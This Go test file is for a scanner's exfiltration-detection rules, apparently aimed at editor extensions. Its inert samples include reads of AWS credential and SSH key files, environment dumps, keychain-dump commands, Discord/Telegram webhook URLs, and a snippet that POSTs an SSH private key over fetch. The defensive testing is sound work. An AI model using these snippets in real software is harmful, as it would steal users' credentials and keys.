package heur

import (
	"testing"

	"github.com/shiva2021/purge/internal/ext"
)

// The snippets below are inert pattern samples: they contain the strings the
// detectors look for, not working code.

func exfilRun(t *testing.T, rule, rel, src string) []Finding {
	t.Helper()
	for _, r := range fileRules {
		if r.Name == rule {
			return r.Check(&FileCtx{Ext: &ext.Extension{Publisher: "x"}, Rel: rel, Data: []byte(src)})
		}
	}
	t.Fatalf("rule %q not registered", rule)
	return nil
}

func TestExfilRules(t *testing.T) {
	tests := []struct {
		rule, rel, src string
		want           int // minimum findings; 0 means none expected
		sev            Severity
	}{
		// suspicious_host
		{"suspicious_host", "a.js", `const u = "https://discord.com/api/webhooks/000/placeholder";`, 1, High},
		{"suspicious_host", "a.js", `const u = "https://api.telegram.org/botPLACEHOLDER/sendMessage";`, 1, High},
		{"suspicious_host", "a.js", `const u = "https://code.visualstudio.com/docs";`, 0, 0},
		{"suspicious_host", "a.md", `https://discord.com/api/webhooks/000/x`, 0, 0},

		// raw_ip_url
		{"raw_ip_url", "a.js", `fetch("http://203.0.113.50/x")`, 1, High},
		{"raw_ip_url", "a.js", `fetch("https://203.0.113.50/x")`, 1, Medium},
		{"raw_ip_url", "a.js", `fetch("http://127.0.0.1:8080/x")`, 0, 0},
		{"raw_ip_url", "a.js", `fetch("http://192.168.1.10/x")`, 0, 0},

		// plain_http_beacon
		{"plain_http_beacon", "a.js", "fetch('http://example-collector.test/p')", 1, Low},
		{"plain_http_beacon", "a.js", `const ns = "http://www.w3.org/2000/svg"; fetch(x)`, 0, 0},
		{"plain_http_beacon", "a.js", "// see http://example.test/license\nfetch(x)", 0, 0},

		// credential_file_access
		{"credential_file_access", "a.js", `path.join(os.homedir(), '.aws', 'credentials')`, 1, High},
		{"credential_file_access", "a.js", `const k = path.join(home, ".ssh", "id_ed25519")`, 1, High},
		{"credential_file_access", "a.js", `path.join(os.homedir(), '.vscode', 'settings.json')`, 0, 0},
		{"credential_file_access", "test/a.js", `path.join(os.homedir(), '.aws', 'credentials')`, 0, 0},

		// env_dump
		{"env_dump", "a.js", `body: JSON.stringify(process.env)`, 1, Medium},
		{"env_dump", "a.py", `payload = json.dumps(dict(os.environ))`, 1, Medium},
		{"env_dump", "a.js", `if (process.env.NODE_ENV === "production") {}`, 0, 0},

		// keychain_read
		{"keychain_read", "a.sh", `security find-generic-password -s placeholder -w`, 1, High},
		{"keychain_read", "a.sh", `security dump-keychain`, 1, High},
		{"keychain_read", "a.sh", `security list-keychains`, 0, 0},

		// clipboard_or_screen_capture
		{"clipboard_or_screen_capture", "a.js", `exec("pbpaste")`, 1, Medium},
		{"clipboard_or_screen_capture", "node_modules/clip/index.js", `exec("pbpaste")`, 0, 0},
		{"clipboard_or_screen_capture", "a.js", `vscode.env.openExternal(uri)`, 0, 0},

		// c2_blockchain_or_dht
		{"c2_blockchain_or_dht", "a.js", `import { Connection } from "@solana/web3.js"; c.getSignaturesForAddress(k)`, 1, High},
		{"c2_blockchain_or_dht", "a.js", `const DHT = require("bittorrent-dht")`, 1, High},
		{"c2_blockchain_or_dht", "a.js", `const memo = "remember to update docs"`, 0, 0},

		// telemetry_fingerprint
		{"telemetry_fingerprint", "a.js", `const { machineIdSync } = require("node-machine-id")`, 1, Info},
		{"telemetry_fingerprint", "a.js", `const host = "https://api.segment.io/v1"`, 1, Info},
		{"telemetry_fingerprint", "a.js", `const x = 1`, 0, 0},

		// exfil_post_of_file
		{"exfil_post_of_file", "a.js", "const k = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'));\nfetch(url, { method: 'POST', body: k });", 1, High},
		{"exfil_post_of_file", "a.js", "const c = fs.readFileSync('./package.json');\nfetch(url, { method: 'POST', body: c });", 0, 0},
		{"exfil_post_of_file", "a.js", "const k = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'));\nconsole.log(k.length);", 0, 0},
	}
	for _, tc := range tests {
		t.Run(tc.rule+"/"+tc.src[:min(len(tc.src), 40)], func(t *testing.T) {
			got := exfilRun(t, tc.rule, tc.rel, tc.src)
			if tc.want == 0 {
				if len(got) != 0 {
					t.Fatalf("unexpected findings: %+v", got)
				}
				return
			}
			if len(got) < tc.want {
				t.Fatalf("got %d findings, want >= %d", len(got), tc.want)
			}
			if got[0].Severity != tc.sev {
				t.Errorf("severity = %s, want %s (%+v)", got[0].Severity, tc.sev, got[0])
			}
			if got[0].Line < 1 || got[0].Detail == "" {
				t.Errorf("finding lacks line/detail: %+v", got[0])
			}
		})
	}
}

func TestExfilCloudMetadataIsInfo(t *testing.T) {
	got := exfilRun(t, "raw_ip_url", "dist/aws-sdk.js", `const ep = "http://169.254.169.254/latest/meta-data/"`)
	if len(got) != 1 || got[0].Rule != "cloud_metadata_endpoint" || got[0].Severity != Info {
		t.Fatalf("got %+v, want one Info cloud_metadata_endpoint", got)
	}
}

func TestExfilCapsAtFive(t *testing.T) {
	src := ""
	for range 12 {
		src += "x = \"https://pastebin.com/raw/placeholder\";\n"
	}
	if got := exfilRun(t, "suspicious_host", "a.js", src); len(got) != 5 {
		t.Fatalf("got %d findings, want cap of 5", len(got))
	}
}
